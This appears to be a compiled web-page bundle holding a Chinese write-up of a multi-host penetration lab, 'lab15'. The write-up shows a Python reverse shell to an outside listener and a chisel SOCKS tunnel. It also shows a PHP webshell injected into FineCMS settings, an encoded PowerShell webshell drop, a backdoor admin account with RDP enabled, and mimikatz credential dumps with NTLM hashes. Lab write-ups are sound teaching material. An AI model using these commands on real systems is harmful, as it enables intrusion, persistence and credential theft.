"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[6269],{83502:(n,e,a)=>{a.r(e),a.d(e,{assets:()=>o,contentTitle:()=>t,default:()=>m,frontMatter:()=>r,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"Independent-Environment/CyberStrikeLab/Scene/lab15/index","title":"lab15","description":"\u573a\u666f\u4ecb\u7ecd","source":"@site/docs/Independent-Environment/CyberStrikeLab/Scene/lab15/index.md","sourceDirName":"Independent-Environment/CyberStrikeLab/Scene/lab15","slug":"/Independent-Environment/CyberStrikeLab/Scene/lab15/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Scene/lab15/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CyberStrikeLab/Scene/lab15/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"lab09","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Scene/lab09/"},"next":{"title":"PRIV-7","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Simulation-Target/PRIV-7/"}}');var d=a(74848),i=a(28453);const r={},t="lab15",o={},c=[{value:"\u5165\u53e3\u70b9",id:"\u5165\u53e3\u70b9",level:2},{value:"\u8d44\u4ea7\u68b3\u7406",id:"\u8d44\u4ea7\u68b3\u7406",level:2},{value:"\u5165\u53e3\u673a - Webmin 1.910 - RCE",id:"\u5165\u53e3\u673a---webmin-1910---rce",level:2},{value:"flag - 1",id:"flag---1",level:2},{value:"\u5165\u53e3\u673a \u4fe1\u606f\u6536\u96c6",id:"\u5165\u53e3\u673a-\u4fe1\u606f\u6536\u96c6",level:2},{value:"\u5165\u53e3\u673a \u642d\u5efa\u4ee3\u7406",id:"\u5165\u53e3\u673a-\u642d\u5efa\u4ee3\u7406",level:2},{value:"cslab - FineCMS",id:"cslab---finecms",level:2},{value:"flag - 2",id:"flag---2",level:2},{value:"cslab - \u4fe1\u606f\u6536\u96c6",id:"cslab---\u4fe1\u606f\u6536\u96c6",level:2},{value:"cslab - hash",id:"cslab---hash",level:2},{value:"DC - \u5c1d\u8bd5",id:"dc---\u5c1d\u8bd5",level:2}];function l(n){const e={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,i.R)(),...n.components};return(0,d.jsxs)(d.Fragment,{children:[(0,d.jsx)(e.header,{children:(0,d.jsx)(e.h1,{id:"lab15",children:"lab15"})}),"\n",(0,d.jsxs)(e.admonition,{type:"info",children:[(0,d.jsx)(e.p,{children:"\u573a\u666f\u4ecb\u7ecd"}),(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsx)(e.p,{children:"ATT&CK\u5b9e\u6218\u6846\u67b6-lab15, \u5f31\u53e3\u4ee4\uff1aroot/test"}),"\n",(0,d.jsxs)(e.ul,{children:["\n",(0,d.jsx)(e.li,{children:"linux\u6e17\u900f"}),"\n",(0,d.jsx)(e.li,{children:"\u5185\u7f51\u6e17\u900f"}),"\n",(0,d.jsx)(e.li,{children:"\u591a\u5c42\u4ee3\u7406"}),"\n",(0,d.jsx)(e.li,{children:"\u6a2a\u5411\u79fb\u52a8"}),"\n",(0,d.jsx)(e.li,{children:"ATT&CK"}),"\n"]}),"\n"]})]}),"\n",(0,d.jsx)(e.h2,{id:"\u5165\u53e3\u70b9",children:"\u5165\u53e3\u70b9"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-plaintext",children:"https://10.10.10.6:10000/\n"})}),"\n",(0,d.jsx)(e.h2,{id:"\u8d44\u4ea7\u68b3\u7406",children:"\u8d44\u4ea7\u68b3\u7406"}),"\n",(0,d.jsxs)(e.table,{children:[(0,d.jsx)(e.thead,{children:(0,d.jsxs)(e.tr,{children:[(0,d.jsx)(e.th,{style:{textAlign:"center"},children:"IP"}),(0,d.jsx)(e.th,{style:{textAlign:"center"},children:"Hostname"})]})}),(0,d.jsxs)(e.tbody,{children:[(0,d.jsxs)(e.tr,{children:[(0,d.jsx)(e.td,{style:{textAlign:"center"},children:"10.10.10.6"}),(0,d.jsx)(e.td,{style:{textAlign:"center"},children:"localhost.localdomain"})]}),(0,d.jsxs)(e.tr,{children:[(0,d.jsx)(e.td,{style:{textAlign:"center"},children:"10.20.30.7"}),(0,d.jsx)(e.td,{style:{textAlign:"center"},children:"localhost.localdomain"})]}),(0,d.jsxs)(e.tr,{children:[(0,d.jsx)(e.td,{style:{textAlign:"center"},children:"10.20.30.5"}),(0,d.jsx)(e.td,{style:{textAlign:"center"},children:"cslab"})]}),(0,d.jsxs)(e.tr,{children:[(0,d.jsx)(e.td,{style:{textAlign:"center"},children:"10.20.30.66"}),(0,d.jsx)(e.td,{style:{textAlign:"center"},children:"DC"})]})]})]}),"\n",(0,d.jsx)(e.h2,{id:"\u5165\u53e3\u673a---webmin-1910---rce",children:"\u5165\u53e3\u673a - Webmin 1.910 - RCE"}),"\n",(0,d.jsx)(e.p,{children:"\u8bbf\u95ee\u5165\u53e3\u70b9\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5728\u8fd4\u56de\u5934\u4e2d\u53d1\u73b0"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-plaintext",children:"Server: MiniServ/1.910\n"})}),"\n",(0,d.jsxs)(e.p,{children:["\u6839\u636e\u6b64\u7279\u5f81\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230 ",(0,d.jsx)(e.a,{href:"https://github.com/roughiz/Webmin-1.910-Exploit-Script",children:"roughiz/Webmin-1.910-Exploit-Script: Webmin 1.910 - Remote Code Execution Using Python Script"})]}),"\n",(0,d.jsx)(e.admonition,{type:"info",children:(0,d.jsx)(e.p,{children:"\u7ecf\u8fc7\u6211\u7684\u53cd\u9988\u4e4b\u540e\uff0c\u7ec8\u4e8e\u7ed9\u51fa\u4e86\u5f31\u53e3\u4ee4\u4fe1\u606f\uff0c\u4e0d\u7136\u539f\u672c\u7684 Webmin \u6846\u67b6\u662f\u6709\u7206\u7834\u53e3\u4ee4\u901f\u7387\u9650\u5236\u7684"})}),"\n",(0,d.jsxs)(e.p,{children:["\u4f46\u662f\u76f4\u63a5\u4f7f\u7528\u73b0\u6709\u7684\u6f0f\u6d1e\u662f\u4e0d\u53ef\u4ee5\u7684\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de ",(0,d.jsx)(e.code,{children:"Perl execution failed"})]}),"\n",(0,d.jsx)(e.p,{children:"\u6362\u4e2a\u601d\u8def\uff0c\u8f6f\u4ef6\u81ea\u5e26\u4e86\u4e00\u4e2a shell"}),"\n",(0,d.jsx)(e.p,{children:"\u5148\u8fdb\u5165 webmin"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:a(57820).A+"",width:"2345",height:"1190"})}),"\n",(0,d.jsx)(e.p,{children:"\u8fdb\u5165\u81ea\u5e26\u7684 Command Shell \u529f\u80fd"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:a(35523).A+"",width:"2341",height:"1188"})}),"\n",(0,d.jsx)(e.p,{children:"\u76f4\u63a5\u53cd\u5f39 shell"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:'python2 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.233.2",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'\n'})}),"\n",(0,d.jsx)(e.p,{children:"\u6210\u529f\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ pwncat-vl -lp 9999\n[22:59:33] Welcome to pwncat \ud83d\udc08!\n[22:59:56] received connection from 10.10.10.6:48518\n[23:00:07] 0.0.0.0:9999: normalizing shell path\n           10.10.10.6:48518: registered new host w/ db\n(local) pwncat$ back\n(remote) root@localhost.localdomain:/root# whoami\nroot\n"})}),"\n",(0,d.jsx)(e.h2,{id:"flag---1",children:"flag - 1"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"(remote) root@localhost.localdomain:/root# cat flag.txt \ngo-flag{9be80fa7-cfae-432f-a43e-ee90b59afabd}\n"})}),"\n",(0,d.jsx)(e.h2,{id:"\u5165\u53e3\u673a-\u4fe1\u606f\u6536\u96c6",children:"\u5165\u53e3\u673a \u4fe1\u606f\u6536\u96c6"}),"\n",(0,d.jsx)(e.p,{children:"\u53d1\u73b0\u662f\u53cc\u7f51\u5361\u673a\u5668"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"(remote) root@localhost.localdomain:/root# ifconfig \nens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.10.10.6  netmask 255.255.255.0  broadcast 0.0.0.0\n        inet6 fe80::82dd:24ff:fee9:995  prefixlen 64  scopeid 0x20<link>\n        ether 80:dd:24:e9:09:95  txqueuelen 1000  (Ethernet)\n        RX packets 5638  bytes 642307 (627.2 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8004  bytes 8352174 (7.9 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nens6: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.20.30.7  netmask 255.255.255.0  broadcast 0.0.0.0\n        inet6 fe80::b293:5ff:fe56:b410  prefixlen 64  scopeid 0x20<link>\n        ether b0:93:05:56:b4:10  txqueuelen 1000  (Ethernet)\n        RX packets 1502  bytes 87605 (85.5 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8  bytes 656 (656.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 12092  bytes 1039500 (1015.1 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 12092  bytes 1039500 (1015.1 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n"})}),"\n",(0,d.jsx)(e.p,{children:"\u4f20\u4e2a fscan \u626b\u63cf\u4e00\u4e0b\u5185\u7f51"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"(remote) root@localhost.localdomain:/root# ./fscan -h 10.20.30.0/24\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 10.20.30.7      is alive\n(icmp) Target 10.20.30.5      is alive\n(icmp) Target 10.20.30.66     is alive\n[*] Icmp alive hosts len is: 3\n10.20.30.5:3306 open\n10.20.30.7:3306 open\n10.20.30.66:445 open\n10.20.30.5:445 open\n10.20.30.66:139 open\n10.20.30.5:139 open\n10.20.30.66:135 open\n10.20.30.5:135 open\n10.20.30.5:80 open\n10.20.30.7:22 open\n10.20.30.66:88 open\n10.20.30.5:88 open\n10.20.30.5:8008 open\n10.20.30.7:10000 open\n[*] alive ports len is: 14\nstart vulscan\n[*] NetInfo \n[*]10.20.30.66\n   [->]DC\n   [->]10.20.30.66\n[*] OsInfo 10.20.30.5   (Windows Server 2016 Standard 14393)\n[*] OsInfo 10.20.30.66  (Windows Server 2022 Standard 20348)\n[*] NetInfo \n[*]10.20.30.5\n   [->]cslab\n   [->]10.20.30.5\n[*] NetBios 10.20.30.5      cslab.cyberstrike.lab               Windows Server 2016 Standard 14393\n[*] WebTitle https://10.20.30.7:10000  code:200 len:4564   title:Login to Webmin\n[*] WebTitle http://10.20.30.5:88      code:500 len:1141   title:500 - \u5185\u90e8\u670d\u52a1\u5668\u9519\u8bef\u3002\n[*] WebTitle http://10.20.30.5         code:200 len:703    title:IIS Windows Server\n[*] WebTitle http://10.20.30.5:8008    code:200 len:22908  title:FineCMS\u516c\u76ca\u8f6f\u4ef6\n"})}),"\n",(0,d.jsx)(e.h2,{id:"\u5165\u53e3\u673a-\u642d\u5efa\u4ee3\u7406",children:"\u5165\u53e3\u673a \u642d\u5efa\u4ee3\u7406"}),"\n",(0,d.jsx)(e.p,{children:"\u5728 kali \u4e0a\u6267\u884c"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ ./tools/chisel_v1.11.3/chisel_1.11.3_linux_amd64 server -p 1337 --reverse\n2025/10/31 23:07:22 server: Reverse tunnelling enabled\n2025/10/31 23:07:22 server: Fingerprint eQTjPEEvWFSqknjphieAOyTHbzdp7iONeDc96XWKr+0=\n2025/10/31 23:07:22 server: Listening on http://0.0.0.0:1337\n"})}),"\n",(0,d.jsx)(e.p,{children:"\u5728\u5165\u53e3\u673a\u4e0a\u542f\u52a8\u4ee3\u7406\u4f1a\u8bdd"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"(remote) root@localhost.localdomain:/root# ./chisel_1.11.3_linux_amd64 client 172.16.233.2:1337 R:0.0.0.0:10000:socks &\n[1] 5722\n2025/10/31 23:08:08 client: Connecting to ws://172.16.233.2:1337\n2025/10/31 23:08:08 client: Connected (Latency 39.75066ms)\n"})}),"\n",(0,d.jsx)(e.h2,{id:"cslab---finecms",children:"cslab - FineCMS"}),"\n",(0,d.jsxs)(e.p,{children:["\u6839\u636e\u9875\u811a\u4fe1\u606f\uff0c\u786e\u5b9a\u7248\u672c\u4fe1\u606f ",(0,d.jsx)(e.code,{children:"FineCMS\u516c\u76ca\u8f6f\u4ef6 v5.1.0"})]}),"\n",(0,d.jsxs)(e.p,{children:["\u7531\u4e8e\u7f51\u7ad9\u914d\u7f6e\u95ee\u9898\uff0c\u73b0\u6709\u7684 ",(0,d.jsx)(e.code,{children:"FineCMS"})," \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u90fd\u662f\u65e0\u6743\u9650\u5199\u5165\u5bfc\u81f4\u4e0d\u53ef\u7528"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:a(29458).A+"",width:"2154",height:"1372"})}),"\n",(0,d.jsx)(e.p,{children:"\u5f88\u660e\u663e\uff0c\u4e0d\u662f\u5199\u5165 webshell \u8fd9\u6761\u8def"}),"\n",(0,d.jsx)(e.p,{children:"sql \u6ce8\u5165\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u662f\u6743\u9650\u4e0d\u662f root \u4e5f\u4e0d\u597d\u7528"}),"\n",(0,d.jsxs)(e.p,{children:["\u53c2\u8003\u53e6\u5916\u4e00\u4e2a\u8def\u5b50 ",(0,d.jsx)(e.a,{href:"https://www.cnblogs.com/hun-ya/p/9392211.html",children:"FineCMS v5.4.1 \u540e\u53f0 getshell - _\u660f\u9e26 - \u535a\u5ba2\u56ed"})]}),"\n",(0,d.jsx)(e.p,{children:"\u5728\u4fee\u6539\u540e\u53f0\u57df\u540d\u7684\u5730\u65b9\u76f4\u63a5\u690d\u5165 webshell"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-plaintext",children:"POST /admin.php?c=site&m=config HTTP/1.1\nHost: 10.20.30.5:8008\nContent-Length: 1129\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://10.20.30.5:8008\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://10.20.30.5:8008/admin.php?c=site&m=config\nAccept-Encoding: gzip, deflate, br\nCookie: 0d88345262358851601fdc63ed5a90d6_ci_session=3pdasfatukr4b6hv1mq90st82m7n8j5t; member_uid=1; member_cookie=385424efe0fa3a5a4655\nConnection: keep-alive\n\npage=1&data%5BSITE_CLOSE%5D=0&data%5BSITE_CLOSE_MSG%5D=%E7%BD%91%E7%AB%99%E5%8D%87%E7%BA%A7%E4%B8%AD....&data%5BSITE_NAME%5D=FineCMS&data%5BSITE_TIME_FORMAT%5D=Y-m-d+H%3Ai&data%5BSITE_LANGUAGE%5D=zh-cn&theme=0&data%5BSITE_THEME%5D=default&data%5BSITE_TEMPLATE%5D=default&data%5BSITE_TIMEZONE%5D=8&domain=localhost%3A8008'=>1).die(assert($_POST['cmd'])//&data%5BSITE_DOMAINS%5D=&data%5BSITE_REWRITE%5D=0&data%5BSITE_MOBILE_OPEN%5D=1&data%5BSITE_MOBILE%5D=&data%5BSITE_SEOJOIN%5D=_&data%5BSITE_TITLE%5D=FineCMS%E5%85%AC%E7%9B%8A%E8%BD%AF%E4%BB%B6&data%5BSITE_KEYWORDS%5D=%E5%85%8D%E8%B4%B9cms%2C%E5%BC%80%E6%BA%90cms&data%5BSITE_DESCRIPTION%5D=%E5%85%AC%E7%9B%8A%E8%BD%AF%E4%BB%B6%E4%BA%A7%E5%93%81%E4%BB%8B%E7%BB%8D&data%5BSITE_IMAGE_RATIO%5D=1&data%5BSITE_IMAGE_WATERMARK%5D=0&data%5BSITE_IMAGE_VRTALIGN%5D=top&data%5BSITE_IMAGE_HORALIGN%5D=left&data%5BSITE_IMAGE_VRTOFFSET%5D=&data%5BSITE_IMAGE_HOROFFSET%5D=&data%5BSITE_IMAGE_TYPE%5D=0&data%5BSITE_IMAGE_OVERLAY%5D=default.png&data%5BSITE_IMAGE_OPACITY%5D=&data%5BSITE_IMAGE_FONT%5D=default.ttf&data%5BSITE_IMAGE_COLOR%5D=&data%5BSITE_IMAGE_SIZE%5D=&data%5BSITE_IMAGE_TEXT%5D=\n"})}),"\n",(0,d.jsx)(e.p,{children:"\u6210\u529f"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:a(63761).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:"\u7531\u4e8e\u8fd9\u4e2a\u65b9\u6848\u690d\u5165\u7684 webshell \u8fd8\u6709\u95ee\u9898\uff0c\u6240\u4ee5\u5199\u5165\u4e00\u4e2a\u5355\u72ec\u7684 webshell"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"powershell -EncodedCommand WwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAEIAeQB0AGUAcwAoACIAcwBoAGUAbABsAC4AcABoAHAAIgAsACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIAUABEADkAdwBhAEgAQQBnAFEARwBWADIAWQBXAHcAbwBKAEYAOQBRAFQAMQBOAFUAVwB5AGQAaABKADEAMABwAEkARAA4ACsAIgApACkA\n"})}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:a(36385).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:"\u5373\u53ef\u6210\u529f\u7528\u8681\u5251\u8fdb\u884c\u8fde\u63a5"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:a(41988).A+"",width:"1542",height:"1040"})}),"\n",(0,d.jsx)(e.h2,{id:"flag---2",children:"flag - 2"}),"\n",(0,d.jsx)(e.p,{children:"\u8001\u4f4d\u7f6e"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:a(33987).A+"",width:"1542",height:"1040"})}),"\n",(0,d.jsx)(e.h2,{id:"cslab---\u4fe1\u606f\u6536\u96c6",children:"cslab - \u4fe1\u606f\u6536\u96c6"}),"\n",(0,d.jsx)(e.p,{children:"\u5f00\u542f\u4e2a rdp"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:'net user randark Admin123### /add\nnet localgroup administrators randark /add\nreg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nnetsh advfirewall firewall set rule group="remote desktop" new enable=yes\nnet start termservice\n'})}),"\n",(0,d.jsx)(e.p,{children:"\u6210\u529f\u8fde\u4e0a"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:a(78361).A+"",width:"2534",height:"1540"})}),"\n",(0,d.jsx)(e.h2,{id:"cslab---hash",children:"cslab - hash"}),"\n",(0,d.jsx)(e.p,{children:"\u4e0a\u4f20\u4e2a mimikatz \u6293\u53d6\u4e00\u4e0b"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"Using 'mimikatz.log' for logfile : OK\n\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 4055423 (00000000:003de17f)\nSession           : RemoteInteractive from 2\nUser Name         : randark\nDomain            : CSLAB\nLogon Server      : CSLAB\nLogon Time        : 2025/10/31 23:47:19\nSID               : S-1-5-21-1569229255-3439354803-3019667840-1000\n    msv :    \n     [00000003] Primary\n     * Username : randark\n     * Domain   : CSLAB\n     * NTLM     : 6e9901f8a9bd75ee67d75ba290581039\n     * SHA1     : bc3b57cb317683e34f68114459d44f07b2b440e8\n    tspkg :    \n    wdigest :    \n     * Username : randark\n     * Domain   : CSLAB\n     * Password : (null)\n    kerberos :    \n     * Username : randark\n     * Domain   : CSLAB\n     * Password : (null)\n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 4023946 (00000000:003d668a)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/10/31 23:47:17\nSID               : S-1-5-90-0-2\n    msv :    \n     [00000003] Primary\n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * NTLM     : 305950dcf3677fc31893b65bad94999b\n     * SHA1     : 4660155d6777adda67170782a06e4c07332c7e84\n    tspkg :    \n    wdigest :    \n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * Password : (null)\n    kerberos :    \n     * Username : CSLAB$\n     * Domain   : cyberstrike.lab\n     * Password : 35 33 d5 18 22 f5 c7 26 8b 5d b9 27 38 31 ae b6 c3 db df a9 d2 75 3a 2a d4 60 0e c0 4e 26 63 9a 4a 75 66 95 a7 ce ab ce e5 03 4b 7f df 77 d4 c7 73 f5 18 7e 61 3d 90 82 d9 9e 93 e9 3f 47 65 28 65 b0 91 83 84 94 5f 2c 95 ff 0a ed 79 15 2b f7 d7 e0 d9 e4 70 25 ab 25 a2 0b 36 07 15 d6 ec 9e 6d 59 ac 27 72 5f 55 67 bc 4e 4c f7 98 14 4e 9a 6b 3d 92 4d fa d1 13 23 32 49 38 13 17 9d 67 b8 63 b9 af d6 cf 23 8d 98 d4 f6 8d dd d1 b0 64 f2 20 1f 5b 03 26 12 03 2e 2c d4 30 57 d8 fa fc 39 d7 e9 35 2a 6c fd d0 65 42 e9 e8 9b 61 ee 41 05 19 9c 58 65 cc 28 cb fd f2 9f 6d 98 11 3a 7b 77 5f ef 96 dc 73 c4 00 3a 59 97 26 84 f4 80 70 94 e5 7f 47 d7 be 58 aa 5f b0 cf 2c 26 72 6a 0c 4b d1 37 e4 82 fd b5 17 db cc 13 10 78 34 84 f1 cb \n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 51168 (00000000:0000c7e0)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/10/31 23:27:50\nSID               : S-1-5-90-0-1\n    msv :    \n     [00000003] Primary\n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * NTLM     : 305950dcf3677fc31893b65bad94999b\n     * SHA1     : 4660155d6777adda67170782a06e4c07332c7e84\n    tspkg :    \n    wdigest :    \n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * Password : (null)\n    kerberos :    \n     * Username : CSLAB$\n     * Domain   : cyberstrike.lab\n     * Password : 35 33 d5 18 22 f5 c7 26 8b 5d b9 27 38 31 ae b6 c3 db df a9 d2 75 3a 2a d4 60 0e c0 4e 26 63 9a 4a 75 66 95 a7 ce ab ce e5 03 4b 7f df 77 d4 c7 73 f5 18 7e 61 3d 90 82 d9 9e 93 e9 3f 47 65 28 65 b0 91 83 84 94 5f 2c 95 ff 0a ed 79 15 2b f7 d7 e0 d9 e4 70 25 ab 25 a2 0b 36 07 15 d6 ec 9e 6d 59 ac 27 72 5f 55 67 bc 4e 4c f7 98 14 4e 9a 6b 3d 92 4d fa d1 13 23 32 49 38 13 17 9d 67 b8 63 b9 af d6 cf 23 8d 98 d4 f6 8d dd d1 b0 64 f2 20 1f 5b 03 26 12 03 2e 2c d4 30 57 d8 fa fc 39 d7 e9 35 2a 6c fd d0 65 42 e9 e8 9b 61 ee 41 05 19 9c 58 65 cc 28 cb fd f2 9f 6d 98 11 3a 7b 77 5f ef 96 dc 73 c4 00 3a 59 97 26 84 f4 80 70 94 e5 7f 47 d7 be 58 aa 5f b0 cf 2c 26 72 6a 0c 4b d1 37 e4 82 fd b5 17 db cc 13 10 78 34 84 f1 cb \n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : CSLAB$\nDomain            : CYBERSTRIKE\nLogon Server      : (null)\nLogon Time        : 2025/10/31 23:27:49\nSID               : S-1-5-20\n    msv :    \n     [00000003] Primary\n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * NTLM     : 305950dcf3677fc31893b65bad94999b\n     * SHA1     : 4660155d6777adda67170782a06e4c07332c7e84\n    tspkg :    \n    wdigest :    \n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * Password : (null)\n    kerberos :    \n     * Username : cslab$\n     * Domain   : CYBERSTRIKE.LAB\n     * Password : (null)\n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 4055394 (00000000:003de162)\nSession           : RemoteInteractive from 2\nUser Name         : randark\nDomain            : CSLAB\nLogon Server      : CSLAB\nLogon Time        : 2025/10/31 23:47:19\nSID               : S-1-5-21-1569229255-3439354803-3019667840-1000\n    msv :    \n     [00000003] Primary\n     * Username : randark\n     * Domain   : CSLAB\n     * NTLM     : 6e9901f8a9bd75ee67d75ba290581039\n     * SHA1     : bc3b57cb317683e34f68114459d44f07b2b440e8\n    tspkg :    \n    wdigest :    \n     * Username : randark\n     * Domain   : CSLAB\n     * Password : (null)\n    kerberos :    \n     * Username : randark\n     * Domain   : CSLAB\n     * Password : (null)\n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 4023821 (00000000:003d660d)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/10/31 23:47:17\nSID               : S-1-5-90-0-2\n    msv :    \n     [00000003] Primary\n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * NTLM     : 305950dcf3677fc31893b65bad94999b\n     * SHA1     : 4660155d6777adda67170782a06e4c07332c7e84\n    tspkg :    \n    wdigest :    \n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * Password : (null)\n    kerberos :    \n     * Username : CSLAB$\n     * Domain   : cyberstrike.lab\n     * Password : 35 33 d5 18 22 f5 c7 26 8b 5d b9 27 38 31 ae b6 c3 db df a9 d2 75 3a 2a d4 60 0e c0 4e 26 63 9a 4a 75 66 95 a7 ce ab ce e5 03 4b 7f df 77 d4 c7 73 f5 18 7e 61 3d 90 82 d9 9e 93 e9 3f 47 65 28 65 b0 91 83 84 94 5f 2c 95 ff 0a ed 79 15 2b f7 d7 e0 d9 e4 70 25 ab 25 a2 0b 36 07 15 d6 ec 9e 6d 59 ac 27 72 5f 55 67 bc 4e 4c f7 98 14 4e 9a 6b 3d 92 4d fa d1 13 23 32 49 38 13 17 9d 67 b8 63 b9 af d6 cf 23 8d 98 d4 f6 8d dd d1 b0 64 f2 20 1f 5b 03 26 12 03 2e 2c d4 30 57 d8 fa fc 39 d7 e9 35 2a 6c fd d0 65 42 e9 e8 9b 61 ee 41 05 19 9c 58 65 cc 28 cb fd f2 9f 6d 98 11 3a 7b 77 5f ef 96 dc 73 c4 00 3a 59 97 26 84 f4 80 70 94 e5 7f 47 d7 be 58 aa 5f b0 cf 2c 26 72 6a 0c 4b d1 37 e4 82 fd b5 17 db cc 13 10 78 34 84 f1 cb \n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 995 (00000000:000003e3)\nSession           : Service from 0\nUser Name         : IUSR\nDomain            : NT AUTHORITY\nLogon Server      